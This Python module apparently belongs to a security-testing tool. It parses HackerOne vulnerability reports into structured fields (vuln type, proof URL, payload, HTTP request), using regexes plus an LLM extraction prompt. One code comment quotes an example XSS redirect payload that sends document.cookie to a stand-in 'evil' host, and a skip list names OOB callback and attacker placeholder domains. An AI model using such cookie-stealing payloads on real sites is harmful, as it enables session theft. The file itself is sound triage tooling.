"""
HackerOne report parser — extracts structured fields from free-form report text.

Supports two modes:
  1. Pattern extraction: URL regex, payload regex, vuln-type keyword scan
  2. LLM fallback: when patterns fail, Claude parses the full report text

Output: H1Report dataclass with url, payload, vuln_type, proof_url, impact, raw_text.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import unquote, urlparse

from dast.utils.logger import get_logger

logger = get_logger(__name__)

# ── Patterns ─────────────────────────────────────────────────────────────────

# URL matcher. We stop only on whitespace, angle brackets and double quotes —
# NOT on single quotes, parens or square brackets, because XSS/redirect payloads
# routinely embed those inside the query string (e.g.
# ?url=javascript:top['location']='https://evil'+document.cookie). Stopping on a
# single quote truncated such proof URLs at "javascript:top[", so the browser
# never received the real payload. Trailing punctuation (a quote/paren that is
# actually sentence punctuation, not part of the URL) is stripped by the
# .rstrip(...) applied at each call site.
_URL_RE = re.compile(
    r'https?://[^\s"<>]+',
    re.IGNORECASE,
)

_PROOF_URL_KEYWORDS = re.compile(
    r'proof\s*url|poc\s*url|vulnerable\s*url|test\s*url|reproduction\s*url',
    re.IGNORECASE,
)

_PAYLOAD_LABEL_RE = re.compile(
    r'payload\s*:?\s*[`\'"]?([^\n`\'"]{1,500})',
    re.IGNORECASE,
)

_BACKTICK_RE = re.compile(r'```([^`]+)```|`([^`\n]{3,})`')

_VULN_TYPE_PATTERNS: list[tuple[str, str]] = [
    (r'\bxss\b|cross.?site.?script', "xss"),
    (r'\bsqli?\b|sql\s*injection',   "sqli"),
    (r'\bssrf\b|server.?side.?request', "ssrf"),
    (r'\bidor\b|insecure.?direct.?object', "idor"),
    (r'\bcsrf\b|cross.?site.?request.?forg', "csrf"),
    (r'\bopen.?redirect\b|unvalidated.?redirect', "open_redirect"),
    (r'\bssti\b|template.?inject', "ssti"),
    (r'\brce\b|remote.?code.?exec|command.?inject', "rce"),
    (r'\blfi\b|local.?file.?inclus|path.?travers', "lfi"),
    (r'\bxxe\b|xml.?external', "xxe"),
    (r'\bauth.?bypass\b|broken.?auth', "auth_bypass"),
    (r'\bbusiness.?logic\b|logic.?flaw', "business_logic"),
    (r'\bprivilege.?escal\b', "privilege_escalation"),
    (r'\binfo.?disclos|sensitive.?data.?exposure', "info_disclosure"),
    # DNS checks — placed after SSRF to avoid mis-classifying SSRF OOB callbacks
    (r'dns\s*(?:take.?over|hijack|zone\s*take)|dangling\s*(?:ns|dns|cname)|ns\s*record.*dangle', "dns_takeover"),
]
_VULN_TYPE_RE: list[tuple[re.Pattern, str]] = [
    (re.compile(pat, re.IGNORECASE), label)
    for pat, label in _VULN_TYPE_PATTERNS
]

_SYSTEM_PARSE = """\
You are a security triage assistant. Extract structured fields from a HackerOne vulnerability report.

Rules for proof_url and target_url:
- Must be the VULNERABLE TARGET — the organization's own host/API being attacked.
- NEVER use attacker-controlled domains (oastify.com, interactsh.com,
  attacker.com, evil.com, ngrok.io, etc.) — these are OOB listeners, not the target.
- NEVER use reference/documentation URLs (medium.com, owasp.org, docs.aws.amazon.com,
  github.com, wikipedia.org, hackerone.com).
- For SSRF: proof_url is the vulnerable API endpoint on the target server (e.g. the endpoint
  that makes the outbound call), NOT the OOB listener URL.
- For dns_takeover: proof_url is the dangling subdomain from "dig X" / "nslookup X" commands.
- If the report shows HTTP request examples with a real Host header (e.g. api.example.com),
  that is the target.
- payload: the actual attack string injected, not a reference or description.
- For SSRF: payload is the OOB/callback URL used as input to the vulnerable parameter.

Rules for the reproducing HTTP request:
- http_method: the method the PoC uses (GET/POST/PUT/PATCH/DELETE). Default GET when the
  report shows no explicit method or curl command.
- request_headers: only headers needed to reproduce (e.g. Content-Type). NEVER include
  Authorization or Cookie — the active session supplies those.
- request_body: the raw body for POST/PUT/PATCH PoCs, verbatim (JSON or form-encoded);
  empty for GET.

Extract the structured fields into the provided tool schema.
"""


@dataclass
class H1Report:
    vuln_type: str = "unknown"
    proof_url: str = ""          # URL that triggers the vuln (may contain payload)
    payload: str = ""            # URL-decoded payload
    target_url: str = ""         # Base URL without payload
    summary: str = ""
    raw_text: str = ""
    all_urls: list[str] = field(default_factory=list)
    # Structured request for faithful reproduction (POST/PUT/JSON PoCs, not GET-only).
    http_method: str = "GET"
    request_headers: dict = field(default_factory=dict)
    request_body: str = ""


def parse_report(text: str) -> H1Report:
    """
    Parse a free-form H1 report. Tries pattern extraction first,
    falls back to LLM if vuln_type or proof_url could not be determined.
    """
    report = H1Report(raw_text=text)

    # ── 1. Vuln type ─────────────────────────────────────────────────────
    for pattern, label in _VULN_TYPE_RE:
        if pattern.search(text):
            report.vuln_type = label
            break

    # ── 2. Extract all URLs ───────────────────────────────────────────────
    raw_urls = _URL_RE.findall(text)
    # Clean trailing punctuation that ends up in the match
    cleaned: list[str] = []
    for u in raw_urls:
        u = u.rstrip(".,;:!?\"')")
        # Normalise escaped entities
        u = u.replace("&amp;", "&")
        if len(u) > 10:
            cleaned.append(u)
    report.all_urls = list(dict.fromkeys(cleaned))  # deduplicate, preserve order

    # ── 2b. For DNS takeover reports, extract the target domain from "dig X" commands.
    # This runs unconditionally so it takes priority over unrelated reference URLs
    # (e.g. medium.com blog links, docs.aws.amazon.com) that appear in the text.
    _DIG_DOMAIN_RE = re.compile(
        r'(?:dig|nslookup)\s+([a-z0-9][a-z0-9\-\.]{3,60}\.[a-z]{2,})',
        re.IGNORECASE,
    )
    _dns_dig_domains: list[str] = []
    for m in _DIG_DOMAIN_RE.finditer(text):
        candidate = m.group(1).strip(".").lower()
        if "." in candidate:
            _dns_dig_domains.append(candidate)

    # Domains that are never the vulnerable target — OOB listeners, placeholder
    # examples, reference docs, attacker infrastructure.
    _SKIP_DOMAINS = {
        # OOB / callback infrastructure
        "oastify.com", "interact.sh", "interactsh.com",
        "canarytokens.com", "requestbin.com", "webhook.site", "pipedream.net",
        "ngrok.io", "ngrok.com", "localtunnel.me",
        # Common placeholder / example domains used in PoC writeups
        "attacker.com", "evil.com", "example.com", "test.com", "localhost",
        "127.0.0.1",
        # Reference / documentation
        "medium.com", "owasp.org", "docs.aws.amazon.com", "aws.amazon.com",
        "hackerone.com", "github.com", "google.com", "wikipedia.org",
        "virustotal.com",
    }

    # Also skip domains that match OOB patterns (random subdomains of callback services)
    _OOB_SUFFIX_RE = re.compile(
        r'\.(oastify\.com|interact\.sh|canarytokens\.com'
        r'|requestbin\.com|webhook\.site)$',
        re.IGNORECASE,
    )

    def _is_skip_url(u: str) -> bool:
        try:
            host = (urlparse(u).hostname or u.split("/")[0]).lower()
            if any(host == d or host.endswith("." + d) for d in _SKIP_DOMAINS):
                return True
            if _OOB_SUFFIX_RE.search(host):
                return True
        except Exception:
            pass
        return False

    # Backward compat alias used below
    _is_reference_url = _is_skip_url

    # ── 3. Proof URL / target domain ─────────────────────────────────────
    # For DNS takeover: the target domain comes from "dig X" commands, not
    # from reference URLs scattered through the report text.
    if report.vuln_type == "dns_takeover" and _dns_dig_domains:
        report.proof_url = _dns_dig_domains[0]
        report.all_urls = _dns_dig_domains + [
            u for u in report.all_urls if not _is_reference_url(u)
        ]
    else:
        lines = text.splitlines()
        for i, line in enumerate(lines):
            if _PROOF_URL_KEYWORDS.search(line):
                for candidate_line in lines[i:i+3]:
                    # Explicit "Proof URL:" label is authoritative — don't filter
                    # by skip domains here; the reporter chose this URL deliberately.
                    urls_in_line = [
                        u.rstrip(".,;:!?\"')")
                        for u in _URL_RE.findall(candidate_line)
                    ]
                    if urls_in_line:
                        report.proof_url = urls_in_line[0]
                        break
                if report.proof_url:
                    break

        # Backtick blocks often contain the full PoC URL
        if not report.proof_url:
            for m in _BACKTICK_RE.finditer(text):
                block = (m.group(1) or m.group(2) or "").strip()
                urls_in_block = [
                    u for u in _URL_RE.findall(block)
                    if not _is_reference_url(u)
                ]
                if urls_in_block:
                    report.proof_url = urls_in_block[0].rstrip(".,;:!?\"')")
                    break

        # Fallback: longest non-reference URL that looks like a PoC (has query params)
        if not report.proof_url:
            target_urls = [u for u in report.all_urls if not _is_reference_url(u)]
            candidates = [u for u in target_urls if "?" in u]
            if candidates:
                report.proof_url = max(candidates, key=len)
            elif target_urls:
                report.proof_url = target_urls[0]
            elif report.all_urls:
                report.proof_url = report.all_urls[0]

    # ── 4. Base target URL (no payload) ──────────────────────────────────
    if report.proof_url:
        try:
            p = urlparse(report.proof_url)
            if p.scheme and p.netloc:
                report.target_url = f"{p.scheme}://{p.netloc}{p.path}"
            else:
                # Bare domain (e.g. from dig extraction) — store as-is
                report.target_url = report.proof_url.split("?")[0]
        except Exception:
            report.target_url = report.proof_url.split("?")[0]

    # ── 5. Payload ────────────────────────────────────────────────────────
    # Explicit "Payload:" label
    m = _PAYLOAD_LABEL_RE.search(text)
    if m:
        raw_payload = m.group(1).strip().strip("`'\"")
        report.payload = unquote(raw_payload)

    # Backtick block on its own line that doesn't look like a URL
    if not report.payload:
        for m2 in _BACKTICK_RE.finditer(text):
            block = (m2.group(1) or m2.group(2) or "").strip()
            if block and "http" not in block.lower() and len(block) < 300:
                report.payload = unquote(block)
                break

    # ── 6. LLM enrichment — always runs ──────────────────────────────────
    # Regex fills in a best-guess; LLM reads the full report context and
    # corrects any field. This ensures the vulnerable target is always the
    # actual asset under attack, not a reference/blog/doc URL in the text.
    try:
        _llm_enrich(report, text)
    except Exception as exc:
        logger.debug("H1 report LLM parse failed", error=str(exc))

    # URL-decode the payload if it's still encoded
    if report.payload and "%" in report.payload:
        try:
            report.payload = unquote(report.payload)
        except Exception:
            pass

    return report


def _llm_enrich(report: H1Report, text: str) -> None:
    """
    Enrich/correct all report fields using Claude.

    The LLM receives the full report text and the regex-extracted values
    so it can confirm or override them. This is the primary extraction
    path — regex is just a fast pre-fill that the LLM can correct.

    Runs SYNCHRONOUSLY — ``bedrock_client.invoke_json`` is a blocking gateway
    call and ``parse_report`` is invoked from a worker thread with no event loop.
    (The previous ``asyncio.get_running_loop().run_until_complete`` path always
    raised RuntimeError off the loop, so LLM enrichment silently never ran.)
    """
    from dast.ai import bedrock_client
    from dast.ai.prompt_safety import UNTRUSTED_CONTENT_DIRECTIVE, wrap_untrusted

    # Give the LLM what regex already found so it can confirm or override
    pre_fill = (
        f"Regex pre-extraction (may be wrong):\n"
        f"  vuln_type: {report.vuln_type}\n"
        f"  proof_url: {report.proof_url or '(empty)'}\n"
        f"  target_url: {report.target_url or '(empty)'}\n"
        f"  payload: {report.payload or '(empty)'}\n\n"
    )
    # The report text is untrusted attacker-supplied content — fence it structurally.
    fenced = wrap_untrusted(text[:3000], "h1_report")
    user = f"{pre_fill}Full report text:\n\n{fenced}"

    from dast.ai.schemas import H1_PARSE_SCHEMA

    result = bedrock_client.invoke_json(
        system=_SYSTEM_PARSE + "\n\n" + UNTRUSTED_CONTENT_DIRECTIVE,
        user=user,
        model_id=bedrock_client.get_fast_model(),
        max_tokens=768,
        temperature=0,
        schema=H1_PARSE_SCHEMA,
    )

    # LLM output always wins — it has full context
    llm_vuln_type = str(result.get("vuln_type", "")).strip()
    llm_proof_url = str(result.get("proof_url", "")).strip()
    llm_payload   = str(result.get("payload", "")).strip()
    llm_target    = str(result.get("target_url", "")).strip()
    llm_summary   = str(result.get("summary", "")).strip()
    llm_method    = str(result.get("http_method", "")).strip().upper()
    llm_body      = str(result.get("request_body", "")).strip()
    llm_headers   = result.get("request_headers", {})

    if llm_vuln_type and llm_vuln_type != "unknown":
        report.vuln_type = llm_vuln_type
    if llm_proof_url:
        report.proof_url = llm_proof_url
    if llm_payload:
        report.payload = llm_payload
    if llm_target:
        report.target_url = llm_target
    if llm_summary:
        report.summary = llm_summary
    if llm_method in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
        report.http_method = llm_method
    if llm_body:
        report.request_body = llm_body
    if isinstance(llm_headers, dict):
        # Never let the report override the session's auth — those come from the
        # active login profile / named session, not attacker-supplied text.
        report.request_headers = {
            str(k): str(v) for k, v in llm_headers.items()
            if str(k).lower() not in ("authorization", "cookie")
        }
